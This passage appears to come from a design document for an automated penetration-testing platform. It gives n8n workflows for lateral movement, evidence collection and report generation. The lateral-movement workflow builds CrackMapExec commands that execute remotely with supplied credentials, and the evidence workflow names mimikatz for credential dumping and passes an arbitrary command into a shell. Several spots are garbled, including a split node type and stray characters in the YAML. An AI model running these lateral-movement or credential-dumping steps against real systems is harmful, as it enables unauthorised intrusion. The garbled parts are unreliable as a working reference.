          // Build CrackMapExec or Metasploit command
          const techniques = {
            'wmiexec': \`cme smb \${request.target_ip} -u \${request.username} -p \${request.password} -x 'whoami'\`,
            'psexec': \`cme smb \${request.target_ip} -u \${request.username} -p \${request.password} --psexec\`,
            'smbexec': \`cme smb \${request.target_ip} -u \${request.username} -p \${request.password} --smbexec\`,
            'atexec': \`cme smb \${request.target_ip} -u \${request.username} -p \${request.password} --hammer\`,
            'ssh': \`ssh \${request.username}@\${request.target_ip} 'whoami'\`
          };
          
          const command = techniques[request.technique] || request.custom_command;
          
          return [{
            json: {
              command: command,
              technique: request.technique,
              source_host: request.source_ip,
              target_host: request.target_ip,
              timeout: 120
            }
          }];
        "
      }
    },
    {
      "name": "Run CME",
      "type": "n8n-nodes-base.executeCommand",
      "parameters": {
        "command": "={{$node['Execute Lateral'].json['command']}}",
        "timeout": "={{$node['Execute Lateral'].json['timeout']}}",
        "options": {
          "workingDirectory": "/tmp/anptop/lateral"
        }
      }
    },
    {
      "name": "Parse Results",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const output = $node['Run CME'].json['stdout'] || '';
          const error = $node['Run CME'].json['stderr'] || '';
          
          const result = {
            success: false,
            error_message: null,
            new_host_accessible: false,
            pivoting_possible: false
          };
          
          // Parse CME output
          if (output.includes('[+]') || output.includes('SUCCESS')) {
            result.success = true;
            result.new_host_accessible = true;
            result.pivoting_possible = true;
          } else if (output.includes('[-]') || output.includes('FAILED')) {
            result.error_message = 'Lateral movement failed';
          }
          
          return [{
            json: result
          }];
        "
      }
    },
    {
      "name": "Create Session",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/lateral-movement",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "source_host_id",
              "value": "={{$node['Trigger'].json['source_host_id']}}"
            },
            {
              "name": "target_host_id",
              "value": "={{$node['Trigger'].json['target_host_id']}}"
            },
            {
              "name": "technique",
              "value": "={{$node['Trigger'].json['technique']}}"
            },
            {
              "name": "status",
              "value": "={{$node['Parse Results'].json['success'] ? 'completed' : 'failed'}}"
            },
            {
              "name": "success",
              "value": "={{$node['Parse Results'].json['success']}}"
            },
            {
              "name": "output",
              "value": "={{$node['Run CME'].json['output']}}"
            }
          ]
        }
      }
    },
    {
      "name": "Collect Evidence",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/webhooks/evidence-collection",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "lateral_movement_id",
              "value": "={{$node['Create Session'].json['id']}}"
            },
            {
              "name": "evidence_types",
              "value": "=['screenshot', 'command_output']"
            }
          ]
        }
      },
      "condition": "={{$node['Parse Results'].json['success']}}"
    },
    {
      "name": "Audit Log",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/audit/log",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "action",
              "value": "'lateral_movement'"
            },
            {
              "name": "resource_type",
              "value": "'host'"
            },
            {
              "name": "details",
              "value": "={{JSON.stringify({source: $node['Trigger'].json['source_ip'], target: $node['Trigger'].json['target_ip'], technique: $node['Trigger'].json['technique'])}}}"
            }
          ]
        }
      }
    }
  ]
}
```

---

## 12. Workflow 12: Evidence Collection Workflow

### 12.1 Evidence Types
```yaml
evidence_types:
  screenshots:
    extensions: ['.png', '.jpg']
    tools: ['import', 'screenshot']
    
  command_output:
    extensions: ['.txt', '.log']
    tools: ['shell', 'meterpreter']
    
  pcaps:
    extensions: ['.pcap', '.pcapng']
    tools: ['tcpdump', 'wireshark']
    
  credentials:
    extensions: ['.txt', '.hash', '.key']
    tools: ['mimikatz', 'gsecdump']
    
  files:
    extensions: ['.*']
    tools: ['download', 'cat']
```

### 12.2 Workflow Implementation
```json
{
  "name": "evidence-collection",
  "nodes": [
    {
      "name": "Trigger",
      "type": "n8n-nodes-base.webhook",
      "parameters": {
        "path": "webhooks/evidence-collection",
        "method": "post"
      }
    },
    {
      "name": "Create Evidence Record",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/evidence",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "host_id",
              "value": "={{$node['Trigger'].json['host_id']}}"
            },
            {
              "name": "evidence_type",
              "value": "={{$node['Trigger'].json['evidence_types'][0]}}"
            },
            {
              "name": "name",
              "value": "={{'evidence_' + Date.now()}}"
            },
            {
              "name": "status",
              "value": "'collecting'"
            }
          ]
        }
      }
    },
    {
      "name": "Generate Filename",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const evidence = $node['Trigger'].json;
          const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
          const evidenceId = $node['Create Evidence Record'].json['id'];
          
          let filename;
          switch (evidence.evidence_types[0]) {
            case 'screenshot':
              filename = \`screenshot_\${evidence.host_ip}_\${timestamp}.png\`;
              break;
            case 'pcap':
              filename = \`pcap_\${evidence.host_ip}_\${evidence.port || 'all'}_\${timestamp}.pcap\`;
              break;
            case 'command_output':
              filename = \`output_\${evidence.command_type || 'generic'}_\${timestamp}.txt\`;
              break;
            default:
              filename = \`evidence_\${evidenceId}_\${timestamp}\`;
          }
          
          return [{
            json: {
              ...evidence,
              evidence_id: evidenceId,
              filename: filename,
              storage_path: \`/tmp/anptop/evidence/\${evidence.engagement_id}/\${filename}\`
            }
          }];
        "
      }
    },
    {
      "name": "Collect Evidence",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const evidence = $node['Generate Filename'].json;
          const evidenceType = evidence.evidence_types[0];
          
          let command;
          switch (evidenceType) {
            case 'screenshot':
              command = \`screenshot /tmp/anptop/evidence/\${evidence.engagement_id}/\${evidence.filename}\`;
              break;
            case 'pcap':
              command = \`tcpdump -i any -w /tmp/anptop/evidence/\${evidence.engagement_id}/\${evidence.filename} -c 1000\`;
              break;
            case 'command_output':
              command = \`echo '\\$ $evidence.command_to_execute\\n\$(\${evidence.command_to_execute})' > /tmp/anptop/evidence/\${evidence.engagement_id}/\${evidence.filename}\`;
              break;
            default:
              command = \`echo 'Evidence collection' > /tmp/anptop/evidence/\${evidence.engagement_id}/\${evidence.filename}\`;
          }
          
          return [{
            json: {
              command: command,
              evidence_id: evidence.evidence_id,
              storage_path: evidence.storage_path
            }
          }];
        "
      }
    },
    {
      "name": "Run Collection",
      "type": "n8.executeCommand",
      "parameters": {
n-nodes-base        "command": "={{$node['Collect Evidence'].json['command']}}",
        "timeout": 120
      }
    },
    {
      "name": "Calculate Hashes",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const path = $node['Collect Evidence'].json['storage_path'];
          const fs = require('fs');
          
          // Calculate SHA-256
          const sha256 = require('crypto').createHash('sha256');
          const fileBuffer = fs.readFileSync(path);
          sha256.update(fileBuffer);
          const sha256Hash = sha256.digest('hex');
          
          // Calculate SHA-512 for sensitive
          const sha512 = require('crypto').createHash('sha512');
          sha512.update(fileBuffer);
          const sha512Hash = sha512.digest('hex');
          
          return [{
            json: {
              sha256_hash: sha256Hash,
              sha512_hash: sha512Hash,
              file_size: fileBuffer.length,
              mime_type: require('mime-types').lookup(path)
            }
          }];
        "
      }
    },
    {
      "name": "Upload to Storage",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/evidence/{{$node['Create Evidence Record'].json['id']}}/upload",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "file_path",
              "value": "={{$node['Collect Evidence'].json['storage_path']}}"
            },
            {
              "name": "sha256_hash",
              "value": "={{$node['Calculate Hashes'].json['sha256_hash']}}"
            },
            {
              "name": "sha512_hash",
              "value": "={{$node['Calculate Hashes'].json['sha512_hash']}}"
            },
            {
              "name": "file_size",
              "value": "={{$node['Calculate Hashes'].json['file_size']}}"
            }
          ]
        }
      }
    },
    {
      "name": "Update Evidence Record",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "put",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/evidence/{{$node['Create Evidence Record'].json['id']}}",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "status",
              "value": "'collected'"
            },
            {
              "name": "storage_path",
              "value": "={{$node['Generate Filename'].json['storage_path']}}"
            },
            {
              "name": "sha256_hash",
              "value": "={{$node['Calculate Hashes'].json['sha256_hash']}}"
            },
            {
              "name": "collected_at",
              "value": "={{new Date().toISOString()}}"
            }
          ]
        }
      }
    },
    {
      "name": "Log Chain of Custody",
      "type": "n8n-nodes-base.httpRequest",
      "parameter": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/evidence/{{$node['Create Evidence Record'].json['id']}}/custody",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "action_type",
              "value": "'collected'"
            },
            {
              "name": "timestamp",
              "value": "={{new Date().toISOString()}}"
            }
          ]
        }
      }
    }
  ]
}
```

---

## 13. Workflow 13: Reporting Trigger Workflow

### 13.1 Workflow Implementation
```json
{
  "name": "reporting-trigger",
  "nodes": [
    {
      "name": "Trigger",
      "type": "n8n-nodes-base.webhook",
      "parameters": {
        "path": "webhooks/report-generation",
        "method": "post"
      }
    },
    {
      "name": "Get Engagement Data",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/engagements/{{$node['Trigger'].json['engagement_id']}}"
      }
    },
    {
      "name": "Gather Vulnerability Data",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/engagements/{{$node['Trigger'].json['engagement_id']}}/vulnerabilities"
      }
    },
    {
      "name": "Gather Host Data",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/engagements/{{$node['Trigger'].json['engagement_id']}}/hosts"
      }
    },
    {
      "name": "Gather Evidence",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "get",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/engagements/{{$node['Trigger'].json['engagement_id']}}/evidence"
      }
    },
    {
      "name": "Generate Executive Report",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const engagement = $node['Get Engagement Data'].json;
          const vulnerabilities = $node['Gather Vulnerability Data'].json;
          const hosts = $node['Gather Host Data'].json;
          
          // Calculate executive metrics
          const metrics = {
            total_vulnerabilities: vulnerabilities.length,
            critical_count: vulnerabilities.filter(v => v.risk_rating === 'critical').length,
            high_count: vulnerabilities.filter(v => v.risk_rating === 'high').length,
            medium_count: vulnerabilities.filter(v => v.risk_rating === 'medium').length,
            low_count: vulnerabilities.filter(v => v.risk_rating === 'low').length,
            hosts_scanned: hosts.length,
            hosts_with_critical: hosts.filter(h => h.critical_count > 0).length,
            average_cvss: calculateAverage(vulnerabilities, 'cvss_base_score')
          };
          
          // Generate executive summary
          const summary = \`
# Executive Summary

## Engagement Overview
- **Client**: \${engagement.client_name}
- **Scope**: \${engagement.scope_targets.length} targets
- **Duration**: \${engagement.start_date} to \${engagement.end_date || 'Present'}

## Key Findings
- **Total Vulnerabilities**: \${metrics.total_vulnerabilities}
- **Critical**: \${metrics.critical_count}
- **High**: \${metrics.high_count}
- **Medium**: \${metrics.medium_count}
- **Low**: \${metrics.low_count}

## Risk Assessment
\`\;
          
          return [{
            json: {
              report_type: 'executive',
              content: summary,
              metrics: metrics
            }
          }];
        "
      }
    },
    {
      "name": "Generate Technical Report",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const engagement = $node['Get Engagement Data'].json;
          const vulnerabilities = $node['Gather Vulnerability Data'].json;
          const hosts = $node['Gather Host Data'].json;
          const evidence = $node['Gather Evidence'].json;
          
          // Generate detailed technical report
          const report = \`
# Technical Assessment Report

## Table of Contents
1. Scope and Methodology
2. Network Infrastructure
3. Vulnerability Findings
4. Exploitation Results
5. Evidence Appendix
6. Recommendations

## 1. Scope and Methodology
\`\;
          
          return [{
            json: {
              report_type: 'technical',
              content: report
            }
          }];
        "
      }
    },
    {
      "name": "Generate Markdown",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const executive = $node['Generate Executive Report'].json;
          const technical = $node['Generate Technical Report'].json;
          const reportType = $node['Trigger'].json['report_type'];
          
          let content;
          if (reportType === 'both') {
            content = executive.content + '\\n\\n' + technical.content;
          } else if (reportType === 'executive') {
            content = executive.content;
          } else {
            content = technical.content;
          }
          
          return [{
            json: {
              content: content,
              executive_metrics: executive.metrics,
              report_type: reportType
            }
          }];
        "
      }
    },
    {
      "name": "Convert to HTML",
      "type": "n8n-nodes-base.executeCommand",
      "parameters": {
        "command": "={{'pandoc -s -r markdown -w html -o /tmp/anptop/reports/' + $node['Trigger'].json['engagement_id'] + '_' + $node['Trigger'].json['report_type'] + '.html'}}",
        "timeout": 60
      }
    },
    {
      "name": "Convert to PDF",
      "type": "n8n-nodes-base.executeCommand",
      "parameters": {
        "command": "={{'wkhtmltopdf /tmp/anptop/reports/' + $node['Trigger'].json['engagement_id'] + '_' + $node['Trigger'].json['report_type'] + '.html /tmp/anptop/reports/' + $node['Trigger'].json['engagement_id'] + '_' + $node['Trigger'].json['report_type'] + '.pdf'}}",
        "timeout": 120
      }
    },
    {
      "name": "Create Report Record",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/reports",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            },
            {
              "name": "report_type",
              "value": "={{$node['Trigger'].json['report_type']}}"
            },
            {
              "name": "html_path",
              "value": "={{'/tmp/anptop/reports/' + $node['Trigger'].json['engagement_id'] + '_' + $node['Trigger'].json['report_type'] + '.html'}}"
            },
            {
              "name": "pdf_path",
              "value": "={{'/tmp/anptop/reports/' + $node['Trigger'].json['engagement_id'] + '_' + $node['Trigger'].json['report_type'] + '.pdf'}}"
            },
            {
              "name": "status",
              "value": "'completed'"
            }
          ]
        }
      }
    },
    {
      "name": "Notify Completion",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/notifications",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "type",
              "value": "'report_ready'"
            },
            {
              "name": "message",
              "value": "'Report ready for engagement ' + $node['Trigger'].json['engagement_id']"
            },
            {
              "name": "engagement_id",
              "value": "={{$node['Trigger'].json['engagement_id']}}"
            }
          ]
        }
      }
    }
  ]
}
```

---

## Appendix A: Global Error Handling Workflow

```json
{
  "name": "global-error-handler",
  "nodes": [
    {
      "name": "Error Trigger",
      "type": "n8n-nodes-base.errorTrigger"
    },
    {
      "name": "Extract Error Info",
      "type": "n8n-nodes-base.function",
      "parameters": {
        "functionCode": "
          const error = items[0].json;
          return [{
            json: {
              workflow_id: error.workflowId,
              workflow_name: error.workflowName,
              node_name: error.node?.name,
              error_message: error.message,
              error_stack: error.stack,
              timestamp: new Date().toISOString(),
              engagement_id: error.engagementId,
              severity: determineSeverity(error.message)
            }
          }];
        "
      }
    },
    {
      "name": "Log Error",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/audit/log",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "action",
              "value": "'workflow_error'"
            },
            {
              "name": "details",
              "value": "={{JSON.stringify($node['Extract Error Info'].json)}}"
            }
          ]
        }
      }
    },
    {
      "name": "Notify Critical",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/notifications",
        "sendBody": true,
        "bodyParameters": {
          "parameters": [
            {
              "name": "type",
              "value": "'critical_error'"
            },
            {
              "name": "priority",
              "value": "={{$node['Extract Error Info'].json['severity']}}"
            },
            {
              "name": "message",
              "value": "={{'Workflow error: ' + $node['Extract Error Info'].json['error_message']}}"
            }
          ]
        }
      },
      "condition": "={{$node['Extract Error Info'].json['severity'] === 'critical'}}"
    },
    {
      "name": "Pause Workflow",
      "type": "n8n-nodes-base.httpRequest",
      "parameters": {
        "method": "post",
        "url": "={{$node['Backend URL'].json['url']}}/api/v1/workflows/{{$node['Extract Error Info'].json['workflow_id']}}/pause",
        "sendBody": true
      },
      "condition": "={{$node['Extract Error Info'].json['severity'] === 'critical'}}"
    }
  ]
}
```

---

## Appendix B: Workflow Configuration

### B.1 n8n Configuration
```yaml
# n8n configuration
n8n:
  host: "0.0.0.0"
  port: 5678
  
  database:
    type: "postgresdb"
    postgresdb:
      host: "postgres"
      port: 5432
      database: "anptop_n8n"
      tablePrefix: "n8n_"
      
  queue:
    type: "bull"
    bull:
      prefix: "n8n"
      redis:
        host: "redis"
        port: 6379
        
  execution:
    order: "v1"
    timeout: 3600
    maxAge: 720
   劝数: 50
    
  security:
    encryptionKey: "${ENCRYPTION_KEY}"
    jwtSecret: "${JWT_SECRET}"
    
  userManagement:
    enabled: true
    isInstanceOwnerSetUp: true
    
  externalStorage:
    enabled: true
    mode: "s3"
    s3:
      bucket: "anptop-n8n-files"
```

### B.2 Workflow Storage
```
workflows/
├── system/
│   ├── global-error-handler.yml
│   ├── notification-handler.yml
│   └── cleanup-worker.yml
├── engagements/
│   ├── {engagement_id}/
│   │   ├── target-intake.yml
│   │   ├── host-discovery.yml
│   │   ├── port-scanning.yml
│   │   ├── service-detection.yml
│   │   ├── vulnerability-assessment.yml
│   │   ├── exploitation.yml
│   │   ├── post-exploitation.yml
│   │   ├── lateral-movement.yml
│   │   └── reporting.yml
```

---

**Document Version**: 1.0  
**Last Updated**: 2024-02-06  
**Classification**: Internal Use Only
